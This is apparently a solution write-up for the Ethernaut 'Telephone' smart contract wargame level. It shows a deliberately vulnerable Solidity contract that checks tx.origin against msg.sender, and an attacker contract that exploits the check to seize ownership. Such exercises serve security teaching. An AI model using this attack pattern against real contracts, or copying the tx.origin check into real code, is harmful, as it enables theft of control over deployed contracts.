---
description: tx.origin and msg.sender
---

# 4 - Telephone

Ethernaut Level4: [Telephone](https://ethernaut.openzeppelin.com/level/0x131c3249e115491E83De375171767Af07906eA36)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

### Goal of this level

* claim ownership of the contract

### What you should know before

* Difference between `tx.origin` and `msg.sender`\
  ``-> see [here](https://www.youtube.com/watch?v=mk4wDlVB4ro)

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

`tx.origin` is the very first initiator's address of the transaction while\
`msg.sender` is the caller address that directly called the contract.

</details>

```solidity
contract AttackTelephone {
    Telephone telephone;

    constructor(Telephone _instanceAddr) {
        telephone = _instanceAddr;
    }

    function attack() external {
        telephone.changeOwner(tx.origin);
    }
}
```

In this problem, `tx.origin` will be your wallet address and `msg.sender` will be the address of `AttackTelephone` contract.

You just need to call `attack()` function.

Done! 😎

## Key Takeaway

* In most cases, it is not recommended to use `tx.origin` in terms of **security**.
